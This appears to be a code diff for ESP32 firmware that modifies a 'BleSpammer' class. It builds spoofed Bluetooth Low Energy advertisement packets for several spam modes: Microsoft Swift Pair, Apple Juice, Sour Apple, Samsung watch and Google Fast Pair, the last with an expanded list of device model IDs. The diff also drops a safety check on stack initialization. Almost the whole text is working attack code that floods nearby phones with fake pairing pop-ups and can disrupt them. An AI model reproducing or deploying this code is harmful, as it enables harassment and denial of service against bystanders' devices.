@@ -20,13 +20,20 @@ static const uint8_t IOS2[]{
     0x02, 0x1e, 0x24,
 };
 
-// Google Fast Pair Models
-struct DeviceType { uint32_t value; };
+// Google Fast Pair Models from https://github.com/Flipper-XFW/Xtreme-Apps
+struct DeviceType {
+    uint32_t value;
+};
 static const DeviceType android_models[] = {
-    {0xCD8256}, {0x0000F0}, {0x821F66}, {0xF52494}, {0x718FA4}, {0x0002F0},
-    {0x92BBBD}, {0x000006}, {0xD446A7}, {0x038B91}, {0x02F637}, {0x02D886},
-    {0xF00000}, {0xF00001}, {0xF00201}, {0xF00305}, {0xF00E97}, {0x04ACFC},
-    {0x04AA91}, {0x04AFB8}, {0x05A963}, {0x06AE20}, {0xD99CA1}, {0xAA187F}
+    {0x0001F0}, {0x000047}, {0x470000}, {0x00000A}, {0x00000B}, {0x00000D}, {0x000007}, {0x000009}, {0x090000},
+    {0x000048}, {0x001000}, {0x00B727}, {0x01E5CE}, {0x0200F0}, {0x00F7D4}, {0xF00002}, {0xF00400}, {0x1E89A7},
+    {0xCD8256}, {0x0000F0}, {0xF00000}, {0x821F66}, {0xF52494}, {0x718FA4}, {0x0002F0}, {0x92BBBD}, {0x000006},
+    {0x060000}, {0xD446A7}, {0x038B91}, {0x02F637}, {0x02D886}, {0xF00000}, {0xF00001}, {0xF00201}, {0xF00209},
+    {0xF00205}, {0xF00305}, {0xF00E97}, {0x04ACFC}, {0x04AA91}, {0x04AFB8}, {0x05A963}, {0x05AA91}, {0x05C452},
+    {0x05C95C}, {0x0602F0}, {0x0603F0}, {0x1E8B18}, {0x1E955B}, {0x1EC95C}, {0x06AE20}, {0x06C197}, {0x06C95C},
+    {0x06D8FC}, {0x0744B6}, {0x07A41C}, {0x07C95C}, {0x07F426}, {0x0102F0}, {0x054B2D}, {0x0660D7}, {0x0103F0},
+    {0x0903F0}, {0xD99CA1}, {0x77FF67}, {0xAA187F}, {0xDCE9EA}, {0x87B25F}, {0x1448C9}, {0x13B39D}, {0x7C6CDB},
+    {0x005EF9}, {0xE2106F}, {0xB37A62}, {0x92ADC9}
 };
 
 // Samsung Watch Models
@@ -56,13 +63,8 @@ void BleSpammer::start(BleSpamMode mode) {
     // DO NOT call requestHostControl or init the stack. 
     // The BLE stack is assumed to be initialized by the system when needed.
     // If the Ducky keyboard was used, the stack is already on. If not, this will fail gracefully.
-    if(!NimBLEDevice::isInitialized()) {
-        LOG(LogLevel::ERROR, "BLESPAM", "Cannot start spam, BLE stack is not initialized.");
-        // We could optionally initialize it here, but it's better to
-        // have a single manager class. For now, we fail.
-        // A more advanced solution would be for BleSpammer to also use BleManager.
-        return; 
-    }
+    // The BLE stack is now managed by BleManager.
+    // We assume it is initialized when this is called.
     
     // Set power level every time to be sure
     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
@@ -134,59 +136,81 @@ NimBLEAdvertisementData BleSpammer::getAdvertisementData(BleSpamMode type) {
     switch (type) {
         case BleSpamMode::MICROSOFT: {
             const char* name = generateRandomName();
-            uint8_t name_len = strlen(name);
-            uint8_t* rawData = new uint8_t[7 + name_len];
-            rawData[0] = 6 + name_len; // Length
-            rawData[1] = 0xFF; // Manufacturer Specific
-            rawData[2] = 0x06; rawData[3] = 0x00; // Microsoft Corp ID
-            rawData[4] = 0x03; rawData[5] = 0x00; rawData[6] = 0x80;
-            memcpy(&rawData[7], name, name_len);
-            adData.addData(rawData, 7 + name_len);
-            delete[] rawData;
+            size_t name_length = strlen(name);
+            uint8_t packet[7 + name_length];
+            uint8_t i = 0;
+            packet[i++] = 6 + name_length; // Size
+            packet[i++] = 0xFF;
+            packet[i++] = 0x06;
+            packet[i++] = 0x00;
+            packet[i++] = 0x03;
+            packet[i++] = 0x00;
+            packet[i++] = 0x80;
+            memcpy(&packet[i], name, name_length);
+            adData.addData(std::string((char *)packet, 7 + name_length));
             break;
         }
         case BleSpamMode::APPLE_JUICE: {
             if (random(2) == 0) {
                 uint8_t packet[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[random() % sizeof(IOS1)],
-                                      0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 
-                                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-                adData.addData(packet, 31);
+                                      0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
+                                      0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
+                                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+                adData.addData(std::string((char *)packet, 31));
             } else {
-                uint8_t packet[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 
-                                      0xc1, IOS2[random() % sizeof(IOS2)], 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 
-                                      0x00, 0x00, 0x00};
-                adData.addData(packet, 23);
+                uint8_t packet[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a,
+                                      0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, IOS2[random() % sizeof(IOS2)],
+                                      0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00,
+                                      0x00, 0x00};
+                adData.addData(std::string((char *)packet, 23));
             }
             break;
         }
         case BleSpamMode::SOUR_APPLE: {
             uint8_t packet[17];
-            packet[0] = 16;   packet[1] = 0xFF; packet[2] = 0x4C; packet[3] = 0x00;
-            packet[4] = 0x0F; packet[5] = 0x05; packet[6] = 0xC1;
+            uint8_t i = 0;
+            packet[i++] = 16;   // Packet Length
+            packet[i++] = 0xFF; // Packet Type (Manufacturer Specific)
+            packet[i++] = 0x4C; // Packet Company ID (Apple, Inc.)
+            packet[i++] = 0x00; // ...
+            packet[i++] = 0x0F; // Type
+            packet[i++] = 0x05; // Length
+            packet[i++] = 0xC1; // Action Flags
             const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
-            packet[7] = types[random() % sizeof(types)];
-            esp_fill_random(&packet[8], 3);
-            packet[11] = 0x00; packet[12] = 0x00; packet[13] = 0x10;
-            esp_fill_random(&packet[14], 3);
-            adData.addData(packet, 17);
+            packet[i++] = types[random() % sizeof(types)]; // Action Type
+            esp_fill_random(&packet[i], 3);                // Authentication Tag
+            i += 3;
+            packet[i++] = 0x00; // ???
+            packet[i++] = 0x00; // ???
+            packet[i++] = 0x10; // Type ???
+            esp_fill_random(&packet[i], 3);
+            adData.addData(std::string((char *)packet, 17));
             break;
         }
         case BleSpamMode::SAMSUNG: {
             uint8_t model = watch_models[random(sizeof(watch_models)/sizeof(watch_models[0]))].value;
-            uint8_t samsungData[15] = {0x0F, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 
-                                       0xFF, 0x00, 0x00, 0x43, model};
-            adData.addData(samsungData, 15);
+            uint8_t packet[15] = {
+                0x0F, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01,
+                0xFF, 0x00, 0x00, 0x43, model
+            };
+            adData.addData(std::string((char *)packet, 15));
             break;
         }
         case BleSpamMode::GOOGLE: {
             const uint32_t model = android_models[random(sizeof(android_models)/sizeof(android_models[0]))].value;
-            uint8_t googleData[14] = {0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE,
-                                      (uint8_t)(model >> 16), (uint8_t)(model >> 8), (uint8_t)model,
-                                      0x02, 0x0A, (uint8_t)(random(120) - 100)};
-            adData.addData(googleData, 14);
+            uint8_t packet[14] = {
+                0x03, 0x03, 0x2C, 0xFE,
+                0x06, 0x16, 0x2C, 0xFE,
+                (uint8_t)((model >> 0x10) & 0xFF),
+                (uint8_t)((model >> 0x08) & 0xFF),
+                (uint8_t)((model >> 0x00) & 0xFF),
+                0x02, 0x0A, (uint8_t)((rand() % 120) - 100)
+            };
+            adData.addData(std::string((char *)packet, 14));
             break;
         }
-        default: break;
+        default:
+            break;
     }
     return adData;
 }
